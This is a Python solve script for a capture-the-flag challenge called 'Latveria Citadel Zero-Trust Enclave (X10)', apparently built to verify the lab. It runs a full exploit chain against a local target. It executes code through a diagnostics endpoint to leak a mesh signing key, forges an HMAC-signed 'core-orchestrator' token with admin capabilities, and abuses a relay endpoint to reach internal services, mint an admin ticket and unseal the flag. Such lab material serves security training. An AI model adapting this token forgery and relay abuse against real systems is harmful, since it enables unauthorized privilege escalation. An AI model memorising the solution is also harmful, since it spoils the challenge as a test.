#!/usr/bin/env python3
"""
Latveria Citadel Zero-Trust Enclave (X10) — Automated Solve Script
Executes full exploit chain:
Gateway -> Low-Trust App -> Trust Discovery -> Context Reproduction -> Trusted Service -> Admin -> Flag
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def http_request(url, method="GET", data_dict=None, headers=None, timeout=10):
    h = headers.copy() if headers else {}
    body = None
    if data_dict is not None:
        body = json.dumps(data_dict).encode("utf-8")
        if "Content-Type" not in h:
            h["Content-Type"] = "application/json"

    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8"), dict(e.headers)


def solve(target="http://127.0.0.1:8080", host=None, port=None) -> str:
    if host is not None and port is not None:
        base = f"http://{host}:{port}".rstrip("/")
    else:
        if not target.startswith("http://") and not target.startswith("https://"):
            target = f"http://{target}"
        base = target.rstrip("/")

    print(f"[*] Target Base URL: {base}")

    # Stage 1: Public Gateway Connectivity & Topology
    print("[+] Stage 1: Connecting to Public Gateway & checking topology...")
    status, body, _ = http_request(f"{base}/api/v1/topology")
    assert status == 200, f"Gateway connection failed with status {status}: {body}"
    topo = json.loads(body)
    print(f"    Gateway Active: {topo.get('challenge_name')} (ID: {topo.get('challenge_id')})")

    # Stage 2: Low-Trust Application Access & Diagnostic Inspection
    print("[+] Stage 2: Querying Low-Trust Edge Worker telemetry...")
    status, body, _ = http_request(f"{base}/api/v1/telemetry/status")
    assert status == 200, f"Telemetry query failed: {status}"
    telem = json.loads(body)
    print(f"    Low-Trust App Status: {telem.get('status')} (Tier: {telem.get('tier')})")

    # Stage 3: Discover Trust Assumption & Extract Mesh Key via Diagnostic Console
    print("[+] Stage 3: Executing diagnostic script to extract internal mesh configuration...")
    diag_payload = {
        "script": "import json\nprint(json.dumps(get_mesh_config()))"
    }
    status, body, _ = http_request(f"{base}/api/v1/diagnostics/exec", method="POST", data_dict=diag_payload)
    assert status == 200, f"Diagnostic execution failed: {status} {body}"
    res_data = json.loads(body)
    if res_data.get("status") != "SUCCESS":
        raise RuntimeError(f"Diagnostic execution error: {res_data}")

    mesh_config = json.loads(res_data["stdout"].strip())
    mesh_key = mesh_config["mesh_signing_key"].encode("utf-8")
    print(f"    [OK] Recovered Mesh Signing Key: {mesh_config['mesh_signing_key'][:20]}...")
    print(f"    [OK] Authorized Identity: {mesh_config['authorized_core_identity']['service_id']}")

    # Stage 4: Reproduce Trusted Request Context (Forge core-orchestrator token)
    print("[+] Stage 4: Forging HMAC-SHA256 service assertion for 'core-orchestrator'...")
    now = int(time.time())
    forged_claims = {
        "service_id": "core-orchestrator",
        "role": "citadel-orchestrator",
        "tier": "autonomous-kernel",
        "capabilities": ["core:admin", "vault:unseal", "system:override"],
        "trust_domain": mesh_config.get("mesh_domain", "latveria.citadel.mesh"),
        "iat": now,
        "exp": now + 3600,
        "nonce": "solver_exploit_nonce_1337"
    }

    payload_json = json.dumps(forged_claims, separators=(',', ':'), sort_keys=True)
    payload_b64 = base64.urlsafe_b64encode(payload_json.encode("utf-8")).decode("utf-8").rstrip("=")
    sig = hmac.new(mesh_key, payload_b64.encode("utf-8"), hashlib.sha256).hexdigest()
    forged_token = f"{payload_b64}.{sig}"
    print(f"    [OK] Forged Token: {forged_token[:36]}...")

    # Stage 5: Reach Trusted Internal Service via Mesh Relay
    print("[+] Stage 5: Dispatching forged assertion to Trusted Internal Service...")
    relay_payload = {
        "target_url": "http://127.0.0.1:8082/api/v1/core/request-admin-ticket",
        "assertion_token": forged_token,
        "method": "POST"
    }
    status, body, _ = http_request(f"{base}/api/v1/relay/dispatch", method="POST", data_dict=relay_payload)
    assert status == 200, f"Relay to trusted service failed: {status} {body}"
    core_resp = json.loads(body)
    admin_ticket = core_resp.get("response", {}).get("admin_ticket")
    assert admin_ticket, f"Failed to acquire admin ticket: {core_resp}"
    print(f"    [OK] Minted Admin Ticket: {admin_ticket}")

    # Stage 6: Reach Admin Service & Unseal Sovereign Flag
    print("[+] Stage 6: Unsealing Citadel Sovereign Vault with Admin Ticket...")
    unseal_payload = {
        "target_url": "http://127.0.0.1:8083/api/v1/admin/unseal",
        "assertion_token": forged_token,
        "payload": {"admin_ticket": admin_ticket},
        "method": "POST"
    }
    status, body, _ = http_request(f"{base}/api/v1/relay/dispatch", method="POST", data_dict=unseal_payload)
    assert status == 200, f"Vault unseal failed: {status} {body}"
    vault_resp = json.loads(body)
    flag = vault_resp.get("response", {}).get("flag")
    assert flag and flag.startswith("YUVA{"), f"Invalid flag received: {vault_resp}"

    print(f"\n=======================================================")
    print(f"[SUCCESS] Flag captured: {flag}")
    print(f"=======================================================\n")
    return flag


def main():
    parser = argparse.ArgumentParser(description="X10 Zero Trust Failure Automated Solver")
    parser.add_argument("--target", default=None, help="Target Gateway URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=8080, help="Target port")
    args = parser.parse_args()

    target = args.target if args.target else f"http://{args.host}:{args.port}"
    try:
        flag = solve(target=target)
        if not flag.startswith("YUVA{"):
            print("[-] Error: Recovered flag does not match expected format!")
            sys.exit(1)
        print("[+] Exploit verification complete: PASS")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Exploit failed with error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
